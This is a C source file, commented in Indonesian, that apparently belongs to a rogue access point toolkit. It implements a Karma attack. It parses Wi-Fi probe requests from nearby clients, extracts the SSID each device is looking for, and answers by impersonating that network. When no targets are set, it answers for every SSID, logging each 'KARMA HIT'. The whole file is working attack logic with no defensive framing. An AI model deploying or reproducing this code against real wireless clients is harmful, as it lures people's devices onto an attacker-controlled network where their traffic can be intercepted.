// ============================================================================
// IMPLEMENTASI: attack/karma.c — Logika Respon Serangan Karma
// ============================================================================
#include "karma.h"
#include "../core/rogue_ap.h"
#include "../utils/utils.h"
#include "../utils/logger.h"
#include <string.h>

#define MAX_TARGET_SSIDS 64
static char g_target_ssids[MAX_TARGET_SSIDS][MAX_SSID_LEN];
static int g_target_count = 0;

/*
 * === FUNGSI: karma_init() ===
 * Tujuan   : Mereset daftar target SSID Karma Attack
 */
int karma_init(void) {
    g_target_count = 0;
    return 0;
}

/*
 * === FUNGSI: karma_cleanup() ===
 * Tujuan   : Membersihkan daftar memori Karma
 */
void karma_cleanup(void) {
    g_target_count = 0;
}

/*
 * === FUNGSI: karma_add_ssid() ===
 * Tujuan   : Mendaftarkan SSID target ke whitelist penyerangan Karma
 */
void karma_add_ssid(const char *ssid) {
    if (g_target_count >= MAX_TARGET_SSIDS) return;
    strncpy(g_target_ssids[g_target_count], ssid, MAX_SSID_LEN - 1);
    g_target_ssids[g_target_count][MAX_SSID_LEN - 1] = '\0';
    g_target_count++;
}

/*
 * === FUNGSI: karma_is_targeted() ===
 * Tujuan   : Memeriksa apakah SSID berada dalam daftar target (atau mode serang semua)
 */
bool karma_is_targeted(const char *ssid) {
    if (g_target_count == 0) return true; // Jika daftar kosong, serap SEMUA SSID yang dicari!
    for (int i = 0; i < g_target_count; i++) {
        if (strcmp(g_target_ssids[i], ssid) == 0) return true;
    }
    return false;
}

/*
 * === FUNGSI: karma_handle_probe_request() ===
 * Tujuan   : Mengurai Probe Request client dan membalas secara instan
 * Catatan  : Menggunakan offset dinamis 24 byte (Fix Audit #1)
 */
int karma_handle_probe_request(ap_config_t *cfg, uint8_t *frame, int len) {
    if (len < 26) return -1;

    wifi_header_t *hdr = (wifi_header_t*)frame;
    uint8_t *client_mac = hdr->addr2;

    // FIX #1: Probe Request IEs mulai tepat di offset 24 (setelah header MAC 24 byte)
    int offset = 24;
    char target_ssid[MAX_SSID_LEN] = {0};

    // Urai Information Elements
    while (offset + 2 <= len) {
        uint8_t tag = frame[offset];
        uint8_t tlen = frame[offset + 1];
        if (offset + 2 + tlen > len) break;

        if (tag == IE_TAG_SSID) {
            if (tlen > 0 && tlen < MAX_SSID_LEN) {
                memcpy(target_ssid, &frame[offset + 2], tlen);
                target_ssid[tlen] = '\0';
            }
            break;
        }
        offset += 2 + tlen;
    }

    // Jika client mencari SSID tertentu dan disetujui filter Karma, balas!
    if (strlen(target_ssid) > 0 && karma_is_targeted(target_ssid)) {
        char mac_str[18];
        format_mac(client_mac, mac_str);
        log_event(LOG_INFO, "🎯 KARMA HIT! Client %s mencari '%s' -> Meniru AP!",
                  mac_str, target_ssid);
        send_probe_response(cfg, client_mac, target_ssid);
        return 0;
    }
    return -1;
}
